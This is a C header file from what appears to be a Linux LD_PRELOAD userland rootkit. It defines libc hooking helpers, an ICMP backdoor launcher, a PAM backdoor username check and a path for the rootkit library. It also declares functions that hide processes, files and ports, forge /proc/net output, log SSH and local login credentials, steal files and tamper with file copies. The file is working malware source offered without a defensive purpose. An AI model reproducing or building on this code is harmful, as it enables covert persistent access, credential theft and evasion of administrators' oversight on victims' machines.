#ifndef _UTIL_H_
#define _UTIL_H_

#ifdef USE_ICMP_BD
void spawnpdoor(void); // sue me
int pdoorup(void);
#endif

#define HOME_VAR "HOME="HOMEDIR

#include "proc/proc.h"

#define isbduname(name) !strncmp(PAM_UNAME, name, LEN_PAM_UNAME)

#define MAGICUSR 0
#define NORMLUSR 1

int rm(const char *path){
    hook(CUNLINK);
    int ulr = (long)call(CUNLINK, path);
    if(ulr < 0 && errno == ENOENT) return 1;
    return ulr;
}

int chown_path(const char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, gid, gid);
}

int notuser(uid_t id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

int isfedora(void){
    int fedora=0;
    hook(CACCESS);
    fedora = (long)call(CACCESS, "/etc/fedora-release", F_OK);
    if(fedora == 0)
        return 1;
    return 0;
}

char *rksopath(char *installdir, char *bdvlso){
    size_t pathsize=strlen(installdir)+strlen(bdvlso)+256;
    char *ret = malloc(pathsize+1);
    if(!ret) return NULL;
    memset(ret, 0, pathsize+1);
    snprintf(ret, pathsize, "%s/%s.$PLATFORM", installdir, bdvlso);
    if(isfedora()) ret[strlen(ret)-10]='\0';
    return ret;
}

char *gdirname(int fd){
    int readlink_status;
    char path[128], *filename = malloc(PATH_MAX+1);
    if(!filename) return NULL;
    memset(filename, 0, PATH_MAX+1);

    snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    readlink_status = (long)call(CREADLINK, path, filename, PATH_MAX);
    if(readlink_status < 0) return NULL;
    return filename;
}

/* if PAM is being used... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}

/* these macro functions were taken from one of PAM's headers.
 * we didn't need the full header, only these two functions.
 * i forget which header they're from originally. */
/*#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)*/
#endif

/* returns a blocksize for fsize. if MAX_BLOCK_SIZE is defined & the initial
 * blocksize is larger than that value, count is incremented until the blocksize
 * to be returned is lower than the defined MAX_BLOCK_SIZE. */
off_t getablocksize(off_t fsize){
    int count = BLOCKS_COUNT;
    off_t blksize = fsize/count;
#ifdef MAX_BLOCK_SIZE
    while(blksize > MAX_BLOCK_SIZE)
        blksize = fsize/count++;
#endif
    return blksize;
}

// opens pathname for reading. the pointer tmp is a tmpfile() meant for filtered & manipulated contents of pathname.
// if either fopen call fails NULL is returned & the calling function decides what to do.
FILE *redirstream(const char *pathname, FILE **tmp){
    FILE *fp;

    hook(CFOPEN);

    fp = call(CFOPEN, pathname, "r");
    if(fp == NULL)
        return NULL;

    *tmp = tmpfile();
    if(*tmp == NULL){
        fclose(fp);
        return NULL;
    }

    return fp;
}

/* lstat on path. pointers fsize & mode are updated with st_size & st_mode.
 * fopen called on path for reading.
 * fopen called on newpath for writing a (likely tampered with) copy.
 * if any of the 3 calls fail NULL is returned.
 * if path is a link NULL is returned.
 * if the pointer nfp is NULL then newpath is not opened for writing in this call & instead (likely) opened some point after this is called. */
FILE *bindup(const char *path, char *newpath, FILE **nfp, off_t *fsize, mode_t *mode){
    FILE *ret;
    struct stat bstat;
    int statr;

    hook(C__LXSTAT, CFOPEN);
    
    memset(&bstat, 0, sizeof(struct stat));
    statr = (long)call(C__LXSTAT, _STAT_VER, path, &bstat);
    if(statr < 0) return NULL;

    *mode = bstat.st_mode;
    if(S_ISLNK(*mode)) // never ever
        return NULL;
    *fsize = bstat.st_size;

    ret = call(CFOPEN, path, "rb");
    if(ret == NULL) return NULL;

    if(nfp != NULL){
        *nfp = call(CFOPEN, newpath, "wb+");
        if(*nfp == NULL){
            fclose(ret);
            return NULL;
        }
    }

    return ret;
}

void fcloser(int c, ...){
    int i=0;
    FILE *fp;
    va_list va;
    va_start(va, c);
    while((fp = va_arg(va, FILE*)) != NULL && i++<c)
        fclose(fp);
    va_end(va);
}

char *linkdest(int dest){
    char *name, *ret;
    size_t pathsize;

    name = linkdests[dest];
    pathsize = LEN_HOMEDIR+strlen(name)+2;
    
    ret = malloc(pathsize);
    if(!ret) return NULL;
    memset(ret, 0, pathsize);
    snprintf(ret, pathsize, "%s/%s", HOMEDIR, name);

    return ret;
}

int _hidden_path(const char *pathname, short mode);
int _f_hidden_path(int fd, short mode);
int _l_hidden_path(const char *pathname, short mode);
int hidden_proc(pid_t pid);
#define MODE_REG 0
#define MODE_64  1
#define hidden_pid(pid)      hidden_proc(getpid())
#define hidden_ppid(pid)     hidden_proc(getppid())
#define hidden_path(path)    _hidden_path(path, MODE_REG)
#define hidden_path64(path)  _hidden_path(path, MODE_64)
#define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
#define hidden_fd64(fd)      _f_hidden_path(fd, MODE_64)
#define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)

off_t getfilesize(const char *path);
off_t getnewfilesize(const char *path, off_t fsize);
off_t getdirsize(const char *dirpath);
off_t getnewdirsize(const char *dirpath, off_t fsize);
#include "size.c"

#if defined LOG_SSH || defined LOG_LOCAL_AUTH
int alreadylogged(const char *logpath, char *logbuf);
int logcount(const char *path);
#include "log.c"
#endif

int rknomore(char *installdir, char *bdvlso);
#include "nomore.c"

#ifdef HIDE_PORTS
int is_hidden_port(int port);
int secret_connection(char line[]);
int hideport_alive(void);
FILE *forge_procnet(const char *pathname);
#endif

void bdvupdate(char *const argv[]);
void eradicatedir(const char *target);
void hidedircontents(const char *target, gid_t magicgid);
#include "magic/magic.h"

int prepareregfile(const char *path, gid_t magicgid);
int preparedir(const char *path, gid_t magicgid);
#ifdef HIDE_ADDRS
void preparehideaddrs(gid_t magicgid);
#endif
#ifdef HIDE_PORTS
void preparehideports(gid_t magicgid);
#endif
void bdprep(void);
#include "prep.c"

#ifdef FILE_STEAL
#include "steal/steal.h"
#endif

#include "install/install.h"

#include "hiding/hiding.h"

#endif